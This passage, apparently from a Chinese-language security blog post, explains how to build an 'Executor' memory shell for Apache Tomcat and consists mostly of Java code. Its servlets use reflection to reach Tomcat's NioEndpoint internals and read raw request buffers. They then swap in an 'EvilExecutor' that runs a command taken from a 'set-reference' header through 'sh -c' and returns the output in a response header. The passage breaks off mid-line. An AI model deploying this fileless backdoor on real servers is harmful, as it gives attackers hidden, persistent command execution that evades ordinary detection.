class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.http11.Http11InputBuffer;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.collections.SynchronizedStack;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.NioEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;ExecutorServlet&quot;, value = &quot;/ExecutorServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecutorServlet</span> <span class="keyword">extends</span> <span class="title class_">HelloServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> &#123;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> ThreadGroup.class.getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Thread[] threads = (Thread[]) field.get(Thread.currentThread().getThreadGroup());</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!thread.getName().contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; thread.getName().contains(<span class="string">&quot;Acceptor&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> Thread.class.getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">pollor</span> <span class="operator">=</span> field1.get(thread);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field7</span> <span class="operator">=</span> pollor.getClass().getDeclaredField(<span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">                    field7.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">NioEndpoint</span> <span class="variable">nioEndpoint1</span> <span class="operator">=</span> (NioEndpoint) field7.get(pollor);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field8</span> <span class="operator">=</span> nioEndpoint1.getClass().getDeclaredField(<span class="string">&quot;poller&quot;</span>);</span><br><span class="line">                    field8.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> field8.get(nioEndpoint1);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> o.getClass().getDeclaredField(<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                    field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">NioEndpoint</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> (NioEndpoint) field2.get(o);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field3</span> <span class="operator">=</span> NioEndpoint.class.getDeclaredField(<span class="string">&quot;nioChannels&quot;</span>);</span><br><span class="line">                    field3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">SynchronizedStack</span> <span class="variable">synchronizedStack</span> <span class="operator">=</span> (SynchronizedStack) field3.get(nioEndpoint);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field4</span> <span class="operator">=</span> SynchronizedStack.class.getDeclaredField(<span class="string">&quot;stack&quot;</span>);</span><br><span class="line">                    field4.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    Object[] object = (Object[]) field4.get(synchronizedStack);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field5</span> <span class="operator">=</span> object[<span class="number">0</span>].getClass().getDeclaredField(<span class="string">&quot;appReadBufHandler&quot;</span>);</span><br><span class="line">                    field5.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Http11InputBuffer</span> <span class="variable">appReadBufHandler</span> <span class="operator">=</span> (Http11InputBuffer) field5.get(object[<span class="number">0</span>]);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field6</span> <span class="operator">=</span> appReadBufHandler.getClass().getDeclaredField(<span class="string">&quot;byteBuffer&quot;</span>);</span><br><span class="line">                    field6.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">ByteBuffer</span> <span class="variable">byteBuffer</span> <span class="operator">=</span> (ByteBuffer) field6.get(appReadBufHandler);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(byteBuffer.array(), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                    System.out.println(s);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Executor/8.png"></p><p>现在解决了接收Request的问题，接下来来解决回显的问题。寻找Response对象依旧可以采用同样的方式来进行查找，这里我采用下断点的方式来寻找可以利用的Response对象，这里在上文获取Request对象的Demo完成后的Response中下一个断点，然后去寻找可以利用的Response对象。</p><p><img src="/2024/05/18/Tomcat-Executor/9.png"></p><p>这里通过层层反射，往获取到的Response对象的header中添加命令执行的回显。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestGroupInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.http11.Http11InputBuffer;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.collections.SynchronizedStack;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.NioEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;ExecutorServlet&quot;, value = &quot;/ExecutorServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecutorServlet</span> <span class="keyword">extends</span> <span class="title class_">HelloServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> &#123;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Executor Inject Successfully...&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> ThreadGroup.class.getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Thread[] threads1 = (Thread[]) field1.get(Thread.currentThread().getThreadGroup());</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads1) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!thread.getName().contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; thread.getName().contains(<span class="string">&quot;Poller&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> thread.getClass().getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> field2.get(thread);</span><br><span class="line">                    <span class="keyword">if</span> (target <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="type">Field</span> <span class="variable">field9</span> <span class="operator">=</span> target.getClass().getDeclaredField(<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                            field9.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            <span class="type">NioEndpoint</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> (NioEndpoint) field9.get(target);</span><br><span class="line">                            <span class="type">Field</span> <span class="variable">field4</span> <span class="operator">=</span> AbstractEndpoint.class.getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line"><span class="comment">//                    Field field4 = AbstractProtocol.class.getDeclaredField(&quot;handler&quot;);</span></span><br><span class="line">                            field4.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> field4.get(nioEndpoint);</span><br><span class="line">                            <span class="type">Field</span> <span class="variable">field5</span> <span class="operator">=</span> handler.getClass().getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                            field5.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            <span class="type">RequestGroupInfo</span> <span class="variable">requestGroupInfo</span> <span class="operator">=</span> (RequestGroupInfo) field5.get(handler);</span><br><span class="line">                            <span class="type">Field</span> <span class="variable">field6</span> <span class="operator">=</span> requestGroupInfo.getClass().getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                            field6.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            <span class="type">ArrayList</span> <span class="variable">arrayList</span> <span class="operator">=</span> (ArrayList) field6.get(requestGroupInfo);</span><br><span class="line">                            <span class="keyword">for</span> (Object o : arrayList) &#123;</span><br><span class="line">                                <span class="type">Field</span> <span class="variable">field7</span> <span class="operator">=</span> o.getClass().getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                                field7.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                                <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) field7.get(o);</span><br><span class="line">                                <span class="type">Field</span> <span class="variable">field8</span> <span class="operator">=</span> request1.getClass().getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">                                field8.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                                <span class="type">Response</span> <span class="variable">response1</span> <span class="operator">=</span> (Response) field8.get(request1);</span><br><span class="line">                                response1.addHeader(<span class="string">&quot;Attack&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;H3rmesk1t&quot;</span>.getBytes(), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                                System.out.println(response1);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Executor/10.png"></p><h2 id="Achievement"><a href="#Achievement" class="headerlink" title="Achievement"></a>Achievement</h2><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>动态全局替换Executor内存马的具体思路如下:</p><ul><li>首先获取对应的NioEndpoint；</li><li>获取对应的executor属性；</li><li>创建一个恶意的executor；</li><li>将恶意的executor传入。</li></ul><h3 id="Dynamic-Registration"><a href="#Dynamic-Registration" class="headerlink" title="Dynamic Registration"></a>Dynamic Registration</h3><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.NioEndpoint;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.threads.ThreadPoolExecutor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;ExecutorMemoryShellServlet&quot;, value = &quot;/ExecutorMemoryShellServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecutorMemoryShellServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">NioEndpoint</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> (NioEndpoint) getNioEndpoint();</span><br><span class="line">        <span class="type">ThreadPoolExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> (ThreadPoolExecutor) nioEndpoint.getExecutor();</span><br><span class="line">        nioEndpoint.setExecutor(<span class="keyword">new</span> <span class="title class_">EvilExecutor</span>(executor.getCorePoolSize(), executor.getMaximumPoolSize(),</span><br><span class="line">                executor.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, executor.getQueue(),</span><br><span class="line">                executor.getThreadFactory()));</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Executor Inject Successfully...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getField</span><span class="params">(Object obj, String field)</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> clazz.getDeclaredField(field);</span><br><span class="line">                declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> declaredField.get(obj);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getNioEndpoint</span><span class="params">()</span> &#123;</span><br><span class="line">        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;Poller&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> getField(target, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilExecutor</span> <span class="keyword">extends</span> <span class="title class_">ThreadPoolExecutor</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EvilExecutor</span><span class="params">(<span class="type">int</span> corePoolSize, <span class="type">int</span> maximumPoolSize, <span class="type">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getRequest</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> getNioEndpoint();</span><br><span class="line">                Object[] objects = (Object[]) getField(getField(nioEndpoint, <span class="string">&quot;nioChannels&quot;</span>), <span class="string">&quot;stack&quot;</span>);</span><br><span class="line">                <span class="type">ByteBuffer</span> <span class="variable">heapByteBuffer</span> <span class="operator">=</span> (ByteBuffer) getField(getField(objects[<span class="number">0</span>], <span class="string">&quot;appReadBufHandler&quot;</span>), <span class="string">&quot;byteBuffer&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">req</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(heapByteBuffer.array(), StandardCharsets.UTF_8);</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.substring(req.indexOf(<span class="string">&quot;set-reference&quot;</span>) + <span class="string">&quot;set-reference&quot;</span>.length() + <span class="number">1</span>, req.indexOf(<span class="string">&quot;\r&quot;</span>, req.indexOf(<span class="string">&quot;set-reference&quot;</span>)) - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span> cmd;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getResponse</span><span class="params">(<span class="type">byte</span>[] res)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> getNioEndpoint();</span><br><span class="line">                <span class="type">ArrayList</span> <span class="variable">processors</span> <span class="operator">=</span> (ArrayList) getField(getField(getField(nioEndpoint, <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>), <span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (Object processor : processors) &#123;</span><br><span class="line">                    <span class="type">RequestInfo</span> <span class="variable">requestInfo</span> <span class="operator">=</span> (RequestInfo) processor;</span><br><span class="line">                    <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) getField(getField(requestInfo, <span class="string">&quot;req&quot;</span>), <span class="string">&quot;response&quot;</span>);</span><br><span class="line">                    response.addHeader(<span class="string">&quot;set-message&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(res, StandardCharsets.UTF_8));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(Runnable command)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> getRequest();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] commands = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span 